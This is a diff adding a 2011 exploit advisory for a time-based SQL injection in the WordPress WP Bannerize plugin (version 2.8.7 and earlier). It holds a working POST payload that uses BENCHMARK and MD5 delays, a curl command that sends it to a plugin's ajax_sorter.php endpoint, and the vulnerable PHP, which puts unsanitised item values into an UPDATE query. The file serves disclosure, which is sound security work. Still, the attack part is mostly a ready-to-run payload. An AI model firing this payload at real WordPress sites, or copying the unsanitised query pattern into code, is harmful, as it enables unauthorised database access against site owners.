@@ -1,0 +1,28 @@
+# Exploit Title: WordPress WP Bannerize plugin <= 2.8.7 SQL Injection Vulnerability
+# Date: 2011-09-22
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/wp-bannerize.zip
+# Version: 2.8.7 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/wp-bannerize/ajax_sorter.php
+ limit=1&offset=1&item[]=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+e.g.
+curl --data "limit=1&offset=1&item[]=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)" -H "X-Requested-With:XMLHttpRequest" http://www.site.com/wp-content/plugins/wp-bannerize/ajax_sorter.php
+
+---------------
+Vulnerable code
+---------------
+if ( @isset($_SERVER['HTTP_X_REQUESTED_WITH']) ) {
+    ...
+    $limit = intval($_POST['limit']);
+    $page_offset = (intval($_POST['offset']) - 1) * $limit;
+
+    foreach($_POST["item"] as $key => $value){
+        $sql = sprintf("UPDATE `%s` SET `sorter` = %s WHERE id = %s", $wpdb->prefix ."bannerize_b", (intval($key)+$page_offset ), $value );
+        $result = mysql_query($sql);
+    }
+}
